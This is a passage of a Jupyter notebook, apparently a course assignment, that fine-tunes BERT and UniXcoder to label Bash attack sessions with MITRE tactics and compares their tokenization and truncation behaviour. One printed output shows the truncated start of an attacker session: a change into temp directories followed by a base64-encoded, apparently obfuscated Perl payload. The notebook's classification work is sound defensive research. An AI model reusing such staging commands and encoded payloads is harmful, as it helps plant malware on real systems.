      "First 200 characters of session: cd /tmp || /var/tmp || /dev/shm ; echo ZXZhbCB1bnBhY2sgdT0+cXtfIkZVWSgiMVA8Rl1DOTctUztSYF0oIj1SPFdFTjhSPFsiQEhEPFY1Uj1GRUQ7VyhdKVMkVC1CWFEuIzROLDM8UStDKFItUjxAPTZZTDk3LVMoIjFTXzk3KVY6NjFPPENMKjs3REApJ ...\n"
     ]
    }
   ],
   "source": [
    "def print_token_stats(series, name):\n",
    "    desc = series.describe()\n",
    "    print(f\"{name} Tokenization Statistics:\")\n",
    "    print(f\"  Count: {int(desc['count'])}\")\n",
    "    print(f\"  Mean: {desc['mean']:.1f}\")\n",
    "    print(f\"  Std: {desc['std']:.1f}\")\n",
    "    print(f\"  Min: {int(desc['min'])}\")\n",
    "    print(f\"  25%: {int(desc['25%'])}\")\n",
    "    print(f\"  Median: {int(desc['50%'])}\")\n",
    "    print(f\"  75%: {int(desc['75%'])}\")\n",
    "    print(f\"  Max: {int(desc['max'])}\\n\")\n",
    "\n",
    "train_data['bert_tokenized'] = train_data['session'].apply(lambda x: bert_tokenizer.tokenize(x))\n",
    "train_data['uni_tokenized'] = train_data['session'].apply(lambda x: unix_tokenizer.tokenize(x))\n",
    "test_data['bert_tokenized'] = test_data['session'].apply(lambda x: bert_tokenizer.tokenize(x))\n",
    "test_data['uni_tokenized'] = test_data['session'].apply(lambda x: unix_tokenizer.tokenize(x))\n",
    "\n",
    "bert_lengths = train_data['bert_tokenized'].apply(len)\n",
    "uni_lengths = train_data['uni_tokenized'].apply(len)\n",
    "\n",
    "print_token_stats(bert_lengths, \"BERT\")\n",
    "print_token_stats(uni_lengths, \"UniXcoder\")\n",
    "\n",
    "bert_lengths = train_data['bert_tokenized'].apply(len)\n",
    "uni_lengths = train_data['uni_tokenized'].apply(len)\n",
    "\n",
    "print(\"Top 10 Longest UniXcoder Tokenized Sessions:\")\n",
    "for idx, length in uni_lengths.sort_values(ascending=False).head(10).items():\n",
    "    print(f\"  Index: {idx:3d} | Tokens: {length}\")\n",
    "\n",
    "print(\"\\nTop 10 Longest BERT Tokenized Sessions:\")\n",
    "for idx, length in bert_lengths.sort_values(ascending=False).head(10).items():\n",
    "    print(f\"  Index: {idx:3d} | Tokens: {length}\")\n",
    "\n",
    "print(\"\\nExample session details for the longest UniXcoder tokenized session:\")\n",
    "max_idx = uni_lengths.idxmax()\n",
    "print(f\"Session Index: {max_idx}\")\n",
    "print(f\"Original Bash word count: {len(train_data.loc[max_idx, 'session'].split(' '))}\")\n",
    "print(f\"First 200 characters of session: {train_data.loc[max_idx, 'session'][:200]} ...\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "p8I5CHLKd86P"
   },
   "source": [
    "### Sessions Exceeding Maximum Token Length\n",
    "\n",
    "- **BERT maximum token length:** 512  \n",
    "- **UniXcoder maximum token length:** 1000000000000000019884624838656 (very large value)\n",
    "\n",
    "**Number of sessions exceeding max length:**  \n",
    "- **BERT:** 24 sessions  \n",
    "- **UniXcoder:** 0 sessions\n",
    "\n",
    "BERT truncates 24 sessions due to its maximum sequence length of 512 tokens, while UniXcoder does not truncate any sessions because its context limit is extremely large."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "4bjlhNHq3Cmg",
    "outputId": "53265ab7-7f5c-465e-ec0c-339d4e48c7d4"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model Maximum Token Lengths:\n",
      "  BERT:      512\n",
      "  UniXcoder: 1000000000000000019884624838656\n",
      "\n",
      "Sessions exceeding max length:\n",
      "  BERT:      24\n",
      "  UniXcoder: 0\n"
     ]
    }
   ],
   "source": [
    "print(\"Model Maximum Token Lengths:\")\n",
    "print(f\"  BERT:      {bert_tokenizer.model_max_length}\")\n",
    "print(f\"  UniXcoder: {unix_tokenizer.model_max_length}\\n\")\n",
    "\n",
    "bert_truncated = train_data['bert_tokenized'].apply(lambda x: len(x) > bert_tokenizer.model_max_length).sum()\n",
    "unix_truncated = train_data['uni_tokenized'].apply(lambda x: len(x) > unix_tokenizer.model_max_length).sum()\n",
    "\n",
    "print(f\"Sessions exceeding max length:\")\n",
    "print(f\"  BERT:      {bert_truncated}\")\n",
    "print(f\"  UniXcoder: {unix_truncated}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "hua7fXwreUMp"
   },
   "source": [
    "### Longest Session Analysis\n",
    "\n",
    "- The session with the highest token count (index 14) contains **134 Bash words**.\n",
    "- **UniXcoder:** 28,918 tokens  \n",
    "- **BERT:** 1,887 tokens\n",
    "\n",
    "Both tokenizers produce a high number of tokens because the session contains long, complex Bash words and possibly encoded payloads, which are split into many sub-tokens.\n",
    "\n",
    "BERT produces fewer tokens because it uses the `[UNK]` token for words it cannot split, replacing the entire unknown word with a single token. UniXcoder does not use `[UNK]`; instead, it splits any unknown or rare word into many sub-tokens, resulting in much higher token counts for complex sessions."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "LcLaxszE3Cmh",
    "outputId": "846fe13b-82a4-4bdf-8ef2-2fd11cf4e37d"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Session Index: 14\n",
      "Number of Bash words: 134\n",
      "\n",
      "First 20 UniXcoder tokens: ['cd', 'Ġ/', 'tmp', 'Ġ||', 'Ġ/', 'var', '/', 'tmp', 'Ġ||', 'Ġ/', 'dev', '/', 'shm', 'Ġ;', 'Ġecho', 'ĠZ', 'XZ', 'hb', 'CB', '1']\n",
      "\n",
      "First 20 BERT tokens: ['cd', '/', 't', '##mp', '|', '|', '/', 'var', '/', 't', '##mp', '|', '|', '/', 'dev', '/', 'sh', '##m', ';', 'echo']\n",
      "\n",
      "Total UniXcoder tokens: 28918\n",
      "Total BERT tokens: 1887\n"
     ]
    }
   ],
   "source": [
    "session_idx = max_idx\n",
    "\n",
    "bash_words = len(train_data.loc[session_idx, 'session'].split(\" \"))\n",
    "\n",
    "print(f\"Session Index: {session_idx}\")\n",
    "print(f\"Number of Bash words: {bash_words}\")\n",
    "print(f\"\\nFirst 20 UniXcoder tokens: {train_data['uni_tokenized'][session_idx][:20]}\")\n",
    "print(f\"\\nFirst 20 BERT tokens: {train_data['bert_tokenized'][session_idx][:20]}\")\n",
    "print(f\"\\nTotal UniXcoder tokens: {len(train_data['uni_tokenized'][session_idx])}\")\n",
    "print(f\"Total BERT tokens: {len(train_data['bert_tokenized'][session_idx])}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "vOXVxewkfNwT"
   },
   "source": [
    "### Truncating Long Words: Tokenization Efficiency\n",
    "\n",
    "After truncating all words longer than 30 characters:\n",
    "\n",
    "- **BERT:**\n",
    "  - Average tokens per session: **126.4**\n",
    "  - Median: **64**\n",
    "  - Maximum: **918**\n",
    "  - **Average tokens per word:** **3.04**\n",
    "- **UniXcoder:**\n",
    "  - Average tokens per session: **108.5**\n",
    "  - Median: **53**\n",
    "  - Maximum: **822**\n",
    "  - **Average tokens per word:** **2.57**\n",
    "\n",
    "Truncating very long words significantly reduces the token count for both models. UniXcoder achieves a slightly better tokens-to-words ratio after truncation, showing better efficiency for code-like and technical data.\n",
    "\n",
    "The scatter plot above shows the relationship between number of words and tokens, with regression lines for both tokenizers."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 948
    },
    "id": "SOkH0lmg3Cmi",
    "outputId": "217549c6-1484-4641-da5e-1f563d9df0a7"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "BERT (truncated) token stats:\n",
      " count    251.000000\n",
      "mean     126.382470\n",
      "std      164.671397\n",
      "min        2.000000\n",
      "25%       25.000000\n",
      "50%       64.000000\n",
      "75%      158.000000\n",
      "max      918.000000\n",
      "Name: trunc_bert_tokenized, dtype: float64\n",
      "\n",
      "UniXcoder (truncated) token stats:\n",
      " count    251.000000\n",
      "mean     108.478088\n",
      "std      144.648161\n",
      "min        2.000000\n",
      "25%       22.000000\n",
      "50%       53.000000\n",
      "75%      136.500000\n",
      "max      822.000000\n",
      "Name: trunc_uni_tokenized, dtype: float64\n",
      "\n",
      "Average tokens per word (BERT): 3.04\n",
      "Average tokens per word (UniXcoder): 2.57\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 700x500 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "def truncate_long_words(session, max_length=30):\n",
    "    return ' '.join([w[:max_length] for w in session.split(\" \")])\n",
    "\n",
    "train_data['trunc_session'] = train_data['session'].apply(truncate_long_words)\n",
    "test_data['trunc_session'] = test_data['session'].apply(truncate_long_words)\n",
    "\n",
    "train_data['trunc_bert_tokenized'] = train_data['trunc_session'].apply(bert_tokenizer.tokenize)\n",
    "train_data['trunc_uni_tokenized'] = train_data['trunc_session'].apply(unix_tokenizer.tokenize)\n",
    "\n",
    "test_data['trunc_bert_tokenized'] = test_data['trunc_session'].apply(bert_tokenizer.tokenize)\n",
    "test_data['trunc_uni_tokenized'] = test_data['trunc_session'].apply(unix_tokenizer.tokenize)\n",
    "\n",
    "\n",
    "\n",
    "bert_lengths = train_data['trunc_bert_tokenized'].apply(len)\n",
    "uni_lengths = train_data['trunc_uni_tokenized'].apply(len)\n",
    "\n",
    "print(\"BERT (truncated) token stats:\\n\", bert_lengths.describe())\n",
    "print(\"\\nUniXcoder (truncated) token stats:\\n\", uni_lengths.describe())\n",
    "\n",
    "\n",
    "word_counts = train_data['trunc_session'].apply(lambda x: len(x.split(\" \")))\n",
    "bert_ratio = (bert_lengths / word_counts).mean()\n",
    "uni_ratio = (uni_lengths / word_counts).mean()\n",
    "print(f\"\\nAverage tokens per word (BERT): {bert_ratio:.2f}\")\n",
    "print(f\"Average tokens per word (UniXcoder): {uni_ratio:.2f}\")\n",
    "\n",
    "from sklearn.linear_model import LinearRegression\n",
    "\n",
    "X = word_counts.values.reshape(-1, 1)\n",
    "reg_bert = LinearRegression().fit(X, bert_lengths.values)\n",
    "reg_uni = LinearRegression().fit(X, uni_lengths.values)\n",
    "\n",
    "plt.figure(figsize=(7, 5))\n",
    "plt.scatter(X, uni_lengths, label='UniXcoder', alpha=0.5)\n",
    "plt.scatter(X, bert_lengths, label='BERT', alpha=0.5)\n",
    "plt.plot(X, reg_bert.predict(X), color='blue', linewidth=2, label='BERT Regression')\n",
    "plt.plot(X, reg_uni.predict(X), color='orange', linewidth=2, label='UniXcoder Regression')\n",
    "plt.xlabel(\"Number of Words\")\n",
    "plt.ylabel(\"Number of Tokens\")\n",
    "plt.title(\"BERT vs UniXcoder Tokenization (with Linear Regression)\")\n",
    "plt.legend()\n",
    "plt.tight_layout()\n",
    "plt.show()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "hlJbjyC6lLxW"
   },
   "source": [
    "### Truncated Sessions After Truncating Long Words\n",
    "\n",
    "- **BERT:** 6 sessions still exceed the max token length (512 tokens)\n",
    "- **UniXcoder:** 0 sessions truncated (context limit is extremely large)\n",
    "\n",
    "Truncating very long words nearly eliminates sequence truncation issues for both tokenizers."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "4upi-KL93Cmk",
    "outputId": "7a952bca-75f9-40af-831e-a2924a0056ad"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sessions exceeding max token length after truncation:\n",
      "  BERT:      6\n",
      "  UniXcoder: 0\n"
     ]
    }
   ],
   "source": [
    "bert_truncated = train_data['trunc_bert_tokenized'].apply(lambda x: len(x) > bert_tokenizer.model_max_length).sum()\n",
    "uni_truncated = train_data['trunc_uni_tokenized'].apply(lambda x: len(x) > unix_tokenizer.model_max_length).sum()\n",
    "\n",
    "print(\"Sessions exceeding max token length after truncation:\")\n",
    "print(f\"  BERT:      {bert_truncated}\")\n",
    "print(f\"  UniXcoder: {uni_truncated}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "WznxopbM3Cmk"
   },
   "source": [
    "## Task 3 : Model Training\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "w3lr_6zImdAb"
   },
   "source": [
    "### Preprocessing and Support Functions\n",
    "\n",
    "For model fine-tuning, we first prepare the dataset and define all required utility functions:\n",
    "\n",
    "- Data split: train, validation, test\n",
    "- Label mapping (label ↔ id)\n",
    "- Metric and plotting functions: accuracy, precision, recall, macro/per-class F1, session fidelity\n",
    "- Model pipeline definition for both pretrained and baseline architectures\n",
    "\n",
    "All key preprocessing and evaluation functions are provided in the following block.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 471,
     "referenced_widgets": [
      "04a5f6bc2c314aec85de2de50394d5f9",
      "f72055b24c7d4f739987cf0fde5034d6",
      "1454c89c9fd6438f8b96bbbadc5c3726",
      "d157b357332f4d27a8eff2beb11eadd5",
      "6ba5aa83813c45488e669619fdfcd136",
      "4ea39590ea4340a7a14ae55ae2847ec5",
      "f1c08a872d9e45a4b8035eaa6eb8a1a9",
      "284944b49720499186e6434b6f247240",
      "db502bdebdcd41128fc3ed346b98225e",
      "e9b1cb9b38944c8e8c6a732e1c3bb07f",
      "47f59986f6bc446d84f6326b72447c36",
      "a13910d1269b424d851df12488c78a39",
      "e9e97edf564b41adb86ae760106a1e1f",
      "5115342e822542119d87ef40fafae50d",
      "22dd0329e2634cedb6fe8611b86a175c",
      "60e7d9dc0fef4d82994ab3bb62ab9bb1",
      "2f0c7624d94d4bda8b6be120c15dce6d",
      "4d5cb695ba6f40e19d9659b520d13a97",
      "2794c2f924794635bb8d26d177d7c56a",
      "b6aaaede279c4766b76c5e9489ecc148",
      "182ecda1bb154cc79b71a04bc3c246b8",
      "7f221484b15040aaa83f7bf30c471017",
      "911d78b59c6440f49609c304478b40e1",
      "9aff5df3e6e44553bf091cbac96eece8",
      "c6c73d6be7384b42af8be45b1e160417",
      "6ac8ce5fce934438938babb3676d0f4c",
      "f252adec3d0649708258d0ee04096603",
      "18ed491010ee4b28a2b7b6e6862586a9",
      "c7f5c99bffc9443ea8e0ff69be5ec7b2",
      "c4b4bd5099f04861b6019525b05ba86b",
      "89953d2deb384c60b29eb9ea1f4e3d1b",
      "9daef65f1c8842fda154fc8befed579f",
      "6364b0977dae486cb37bd283f8632c3d"
     ]
    },
    "id": "d8QQCA6WpASB",
    "outputId": "11b629b9-1bcb-4de6-e1bf-65ed87d9b51c"
   },
   "outputs": [],
   "source": [
    "train_data_split, val_data_split = train_test_split(train_data, test_size=0.2, random_state=42)\n",
    "print(f\"Train set size:      {train_data_split.shape[0]:>4}\")\n",
    "print(f\"Validation set size: {val_data_split.shape[0]:>4}\")\n",
    "print(f\"Test set size:       {test_data.shape[0]:>4}\\n\")\n",
    "\n",
    "full_ds = DatasetDict({\n",
    "    \"train\": Dataset.from_pandas(train_data_split.reset_index(drop=True)),\n",
    "    \"valid\": Dataset.from_pandas(val_data_split.reset_index(drop=True)),\n",
    "    \"test\": Dataset.from_pandas(test_data.reset_index(drop=True)),\n",
    "})\n",
    "\n",
    "unique_labels = list(train_data.label.explode().unique())\n",
    "print(\"Unique labels:\")\n",
    "print(unique_labels)\n",
    "print()\n",
    "\n",
    "id2label = {i: label for i, label in enumerate(unique_labels)}\n",
    "label2id = {label: i for i, label in enumerate(unique_labels)}\n",
    "\n",
    "print(\"Label to ID mapping:\")\n",
    "for k in label2id:\n",
    "    print(f\"  {k:18}: {label2id[k]}\")\n",
    "print()\n",
    "\n",
    "def convert_labels_to_ids(sample):\n",
    "    sample['label_id'] = [label2id[el] for el in sample[\"label\"]]\n",
    "    return sample\n",
    "\n",
    "encoded_dataset = full_ds.map(convert_labels_to_ids)\n",
    "display(pd.DataFrame([encoded_dataset]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "pMrc8dQG3Cmo"
   },
   "outputs": [],
   "source": [
    "def postprocess(predictions, labels):\n",
    "    predictions = predictions.detach().cpu().clone().numpy()\n",
    "    labels = labels.detach().cpu().clone().numpy()\n",
    "    true_labels = [[id2label[l] for l in label if l != -100] for label in labels]\n",
    "    true_predictions = [\n",
    "        [id2label[p] for (p, l) in zip(prediction, label) if l != -100]\n",
    "        for prediction, label in zip(predictions, labels)\n",
    "    ]\n",
    "    return true_labels, true_predictions\n",
    "\n",
    "def compute_metrics(full_predictions, full_labels):\n",
    "    flat_predictions = list(chain(*full_predictions))\n",
    "    flat_labels = list(chain(*full_labels))\n",
    "    metrics = {\n",
    "        \"token_accuracy\": accuracy_score(flat_labels, flat_predictions),\n",
    "        \"token_precision\": precision_score(flat_labels, flat_predictions, average='macro', zero_division=0),\n",
    "        \"token_recall\": recall_score(flat_labels, flat_predictions, average='macro', zero_division=0),\n",
    "        \"token_f1\": f1_score(flat_labels, flat_predictions, average='macro', zero_division=0),\n",
    "    }\n",
    "    return metrics\n",
    "\n",
    "def plot_stats(title, training_losses, validation_losses=None, best_epoch=None):\n",
    "    plt.style.use('seaborn-v0_8-paper')\n",
    "    colors = {\n",
    "        'training': '#2E86C1',\n",
    "        'validation': '#27AE60',\n",
    "        'best_epoch': '#E74C3C',\n",
    "    }\n",
    "    if validation_losses is not None:\n",
    "        fig, ((ax1, ax2)) = plt.subplots(1, 2, figsize=(5,3))\n",
    "    else:\n",
    "        fig, ax1 = plt.subplots(1, figsize=(5,4))\n",
    "\n",
    "    ax1.plot(training_losses, color=colors['training'], linewidth=2)\n",
    "    ax1.set_title('Training Loss', fontsize=12, pad=10)\n",
    "    ax1.set_ylabel('Loss', fontsize=10)\n",
    "    ax1.set_xlabel('Training Steps', fontsize=10)\n",
    "\n",
    "    if validation_losses is not None:\n",
    "        ax1.axvline(x=best_epoch, color=colors['best_epoch'], linestyle='--', alpha=0.8, label='Best Epoch')\n",
    "        ax2.plot(validation_losses, color=colors['validation'], linewidth=2)\n",
    "        ax2.axvline(x=best_epoch, color=colors['best_epoch'], linestyle='--', alpha=0.8, label='Best Epoch')\n",
    "        ax2.set_title('Validation Loss', fontsize=12, pad=10)\n",
    "        ax2.set_ylabel('Loss', fontsize=10)\n",
    "        ax2.set_xlabel('Training Steps', fontsize=10)\n",
    "        axs = [ax1, ax2]\n",
    "    else:\n",
    "        axs = [ax1]\n",
    "\n",
    "    for ax in axs:\n",
    "        ax.grid(True, linestyle='--', alpha=0.7)\n",
    "        ax.spines['top'].set_visible(False)\n",
    "        ax.spines['right'].set_visible(False)\n",
    "        if len(axs) > 1:\n",
    "            ax.legend(fontsize=8)\n",
    "    fig.suptitle(f'{title} - Training Losses', fontsize=14, y=1.02)\n",
    "    plt.tight_layout()\n",
    "    plt.show()\n",
    "\n",
    "def compute_per_class_f1(full_predictions, full_labels, labels):\n",
    "    flat_predictions = list(chain(*full_predictions))\n",
    "    flat_labels = list(chain(*full_labels))\n",
    "    report = classification_report(flat_labels, flat_predictions, output_dict=True, labels=labels, zero_division=0)\n",
    "    per_class_f1 = {tag: report[tag]['f1-score'] for tag in labels if tag in report}\n",
    "    return per_class_f1\n",
    "\n",
    "def plot_per_class_f1(per_class_f1_scores, title):\n",
    "    plt.style.use('seaborn-v0_8-paper')\n",
    "    tags = list(per_class_f1_scores.keys())\n",
    "    f1_scores = list(per_class_f1_scores.values())\n",
    "    sorted_tags, sorted_f1_scores = zip(*sorted(zip(tags, f1_scores), key=lambda x: x[0]))\n",
    "    colors = plt.cm.tab20(np.linspace(0, 1, len(sorted_tags)))\n",
    "    fig, ax = plt.subplots(1, figsize=(5, 4))\n",
    "    ax.bar(sorted_tags, sorted_f1_scores, color=colors)\n",
    "    threshold_labels = {\n",
    "        0.4: \"Bad\",\n",
    "        0.6: \"Poor to Fair\",\n",
    "        0.8: \"Good\",\n",
    "        1.0: \"Excellent\"\n",
    "    }\n",
    "    for y, label in threshold_labels.items():\n",
    "        ax.axhline(y, color='red', linestyle='--', linewidth=0.8)\n",
    "        ax.text(\n",
    "            x=len(sorted_tags) - 0.5,\n",
    "            y=y + 0.01,\n",
    "            s=label,\n",
    "            fontsize=8,\n",
    "            color='red',\n",
    "            ha='right',\n",
    "            va='bottom'\n",
    "        )\n",
    "    ax.set_xlabel(\"MITRE Tactic Tag\", fontsize=10)\n",
    "    ax.set_ylabel(\"F1-score\", fontsize=10)\n",
    "    ax.set_title(f\"{title} - Per-Class F1-score on Test Set\", fontsize=12, pad=10)\n",
    "    ax.set_xticks(range(len(sorted_tags)))\n",
    "    ax.set_xticklabels(sorted_tags, rotation=45, ha='right')\n",
    "    ax.grid(True, linestyle='--', alpha=0.7)\n",
    "    ax.spines['top'].set_visible(False)\n",
    "    ax.spines['right'].set_visible(False)\n",
    "    plt.tight_layout()\n",
    "    plt.show()\n",
    "\n",
    "def calculate_session_fidelity(true_labels, predicted_labels):\n",
    "    correct_predictions = sum(1 for true, pred in zip(true_labels, predicted_labels) if true == pred)\n",
    "    total_tokens = len(true_labels)\n",
    "    return correct_predictions / total_tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "zrwCfUp53Cmo"
   },
   "outputs": [],
   "source": [
    "def pipeline(model_name, model, lr, n_train_epochs, title):\n",
    "    tokenizer = AutoTokenizer.from_pretrained(model_name, add_prefix_space=True)\n",
    "\n",
    "    # --- Tokenization and label alignment functions ---\n",
    "    def align_labels_with_tokens(labels, word_ids):\n",
    "        new_labels = []\n",
    "        current_word = None\n",
    "        for word_id in word_ids:\n",
    "            if word_id != current_word:\n",
    "                current_word = word_id\n",
    "                label = -100 if word_id is None else labels[word_id]\n",
    "                new_labels.append(label)\n",
    "            elif word_id is None:\n",
    "                new_labels.append(-100)\n",
    "            else:\n",
    "                label = labels[word_id]\n",
    "                new_labels.append(label)\n",
    "        return new_labels\n",
    "\n",
    "    def tokenize_and_align_labels(samples):\n",
    "        split_sentences = [sentence.split(\" \") for sentence in samples[\"trunc_session\"]]\n",
    "        tokenized_inputs = tokenizer(\n",
    "            split_sentences,\n",
    "            truncation=True,\n",
    "            is_split_into_words=True\n",
    "        )\n",
    "        all_labels = samples[\"label_id\"]\n",
    "        new_labels = []\n",
    "        for i, labels in enumerate(all_labels):\n",
    "            word_ids = tokenized_inputs.word_ids(i)\n",
    "            aligned_labels = align_labels_with_tokens(labels, word_ids)\n",
    "            new_labels.append(aligned_labels)\n",
    "        tokenized_inputs[\"labels\"] = new_labels\n",
    "        return tokenized_inputs\n",
    "\n",
    "    # --- Dataset tokenization ---\n",
    "    original_columns = encoded_dataset[\"train\"].column_names\n",
    "    tokenized_datasets = encoded_dataset.map(\n",
    "        tokenize_and_align_labels,\n",
    "        batched=True,\n",
    "        remove_columns=original_columns,\n",
    "    )\n",
    "\n",
    "    # --- Dataloaders ---\n",
    "    data_collator = DataCollatorForTokenClassification(tokenizer=tokenizer)\n",
    "    train_dataloader = DataLoader(\n",
    "        tokenized_datasets[\"train\"],\n",
    "        shuffle=True,\n",
    "        collate_fn=data_collator,\n",
    "        batch_size=16,\n",
    "    )\n",
    "    eval_dataloader = DataLoader(\n",
    "        tokenized_datasets[\"valid\"], collate_fn=data_collator, batch_size=16\n",
    "    )\n",
    "    test_dataloader = DataLoader(\n",
    "        tokenized_datasets[\"test\"], collate_fn=data_collator, batch_size=16\n",
    "    )\n",
    "\n",
    "    # --- Optimizer and LR scheduler ---\n",
    "    optimizer = AdamW(model.parameters(), lr=lr)\n",
    "    num_update_steps_per_epoch = len(train_dataloader)\n",
    "    num_training_steps = n_train_epochs * num_update_steps_per_epoch\n",
    "    lr_scheduler = get_scheduler(\n",
    "        \"linear\",\n",
    "        optimizer=optimizer,\n",
    "        num_warmup_steps=0,\n",
    "        num_training_steps=num_training_steps,\n",
    "    )\n",
    "\n",
    "    # --- Training loop ---\n",
    "    best_val_loss, best_epoch = np.inf, 0\n",
    "    best_model = deepcopy(model)\n",
    "    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "    model = model.to(device)\n",
    "    progress_bar = tqdm(range(num_training_steps))\n",
    "    val_losses, train_losses = [], []\n",
    "\n",
    "    for epoch in range(n_train_epochs):\n",
    "        model.train()\n",
    "        train_loss = 0\n",
    "        for batch in train_dataloader:\n",
    "            batch = {key:value.to(device) for key, value in batch.items()}\n",
    "            outputs = model(input_ids=batch[\"input_ids\"],\n",
    "                            attention_mask=batch[\"attention_mask\"],\n",
    "                            labels=batch[\"labels\"])\n",
    "            loss = outputs.loss\n",
    "            train_loss += loss.detach().cpu().clone().numpy()\n",
    "            loss.backward()\n",
    "            optimizer.step()\n",
    "            lr_scheduler.step()\n",
    "            optimizer.zero_grad()\n",
    "            progress_bar.update(1)\n",
    "        train_losses.append(train_loss/len(train_dataloader))\n",
    "\n",
    "        # --- Validation at end of each epoch ---\n",
    "        model.eval()\n",
    "        full_predictions, full_labels = [], []\n",
    "        val_loss = 0\n",
    "        for batch in eval_dataloader:\n",
    "            batch = {key:value.to(device) for key, value in batch.items()}\n",
    "            with torch.no_grad():\n",
    "                outputs = model(**batch)\n",
    "            val_loss += outputs.loss.detach().cpu().clone().numpy()\n",
    "            predictions = outputs.logits.argmax(dim=-1)\n",
    "            labels = batch[\"labels\"]\n",
    "            true_predictions, true_labels = postprocess(predictions, labels)\n",
    "            full_predictions += true_predictions\n",
    "            full_labels += true_labels\n",
    "        val_loss = val_loss/len(eval_dataloader)\n",
    "        val_losses.append(val_loss)\n",
    "        metrics = compute_metrics(full_predictions, full_labels)\n",
    "        if val_loss <= best_val_loss:\n",
    "            best_epoch = epoch\n",
    "            best_val_loss = val_loss\n",
    "            best_model = deepcopy(model)\n",
    "\n",
    "    # --- Plot training and validation loss ---\n",
    "    plot_stats(title, train_losses, validation_losses=val_losses, best_epoch=best_epoch)\n",
    "\n",
    "    # --- Final evaluation on test set ---\n",
    "    model.eval()\n",
    "    full_predictions, full_labels = [], []\n",
    "    for batch in test_dataloader:\n",
    "        batch = {key:value.to(device) for key, value in batch.items()}\n",
    "        with torch.no_grad():\n",
    "            outputs = model(**batch)\n",
    "        predictions = outputs.logits.argmax(dim=-1)\n",
    "        labels = batch[\"labels\"]\n",
    "        true_predictions, true_labels = postprocess(predictions, labels)\n",
    "        full_predictions += true_predictions\n",
    "        full_labels += true_labels\n",
    "\n",
    "    # --- Compute and print metrics ---\n",
    "    test_metrics = compute_metrics(full_predictions, full_labels)\n",
    "    for key in [\"token_accuracy\", \"token_f1\", \"token_precision\", \"token_recall\"]:\n",
    "        print(f\"{key:<20}: {test_metrics[key]*100:6.2f}%\")\n",
    "\n",
    "    # --- Per-class F1-score plot ---\n",
    "    print(\"Per-class f1-score: reports the results in a barplot.\")\n",
    "    per_class_f1_scores = compute_per_class_f1(full_predictions, full_labels, unique_labels)\n",
    "    plot_per_class_f1(per_class_f1_scores, title)\n",
    "    # --- Session fidelity calculation ---\n",
    "    session_fidelities = [calculate_session_fidelity(true_sess_labels, pred_sess_labels)\n",
    "                          for true_sess_labels, pred_sess_labels in zip(full_labels, full_predictions)]\n",
    "    average_fidelity = np.mean(session_fidelities)\n",
    "    print(f\"Average Session Fidelity on Test Set: {average_fidelity:.4f}\")\n",
    "\n",
    "    return {title: test_metrics}, {title: per_class_f1_scores}, best_model\n",
    "\n",
    "results = {}\n",
    "dict_f1_scores = {}\n",
    "\n",
    "train_epochs = 5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "Kk_JhRuGknQq"
   },
   "source": [
    "### Bert Pretrained"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "Q9BD9O-q3Cmo"
   },
   "outputs": [],
   "source": [
    "torch.manual_seed(42)\n",
    "torch.cuda.manual_seed(42)\n",
    "\n",
    "model_name = \"google-bert/bert-base-uncased\"\n",
    "bert_pretrained = AutoModelForTokenClassification.from_pretrained(\n",
    "        pretrained_model_name_or_path=model_name,\n",
    "        id2label=id2label,\n",
    "        label2id=label2id,\n",
    "    )\n",
    "\n",
    "\n",
    "r, f1, _= (pipeline(model_name, bert_pretrained, lr=1e-5, n_train_epochs=train_epochs, title=\"Bert Pretrained\"))\n",
    "results.update(r)\n",
    "dict_f1_scores.update(f1)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "7SX0YLHVrU4c"
   },
   "source": [
    "Can the model achieve \"good\" results with only 251 training labeled samples? Where does it have the most difficulties?\n",
    "\n",
    "\n",
    "token_accuracy is higher than 80%\n",
    "It is excelent with Discovery and Persistence, good with Execution, Defence Evasion and Impact, instead it achieves worse performance with Not Malicious Yet and Others.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "7YBLFUMlt6R-"
   },
   "source": [
    "Assume that this is a ‘simple problem’ (i.e., any model, refined with the same samples,\n",
    "could achieve the same scores). Therefore, create a baseline where instead of a pre-trained\n",
    "BERT (with its pre-trained weights), you load only the BERT architecture. Train this\n",
    "‘naked’ BERT in an end-to-end manner.\n",
    "Q: Can you achieve the same performance? Report your results."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "S8g3H2sJuPiK"
   },
   "outputs": [],
   "source": [
    "torch.manual_seed(42)\n",
    "torch.cuda.manual_seed(42)\n",
    "\n",
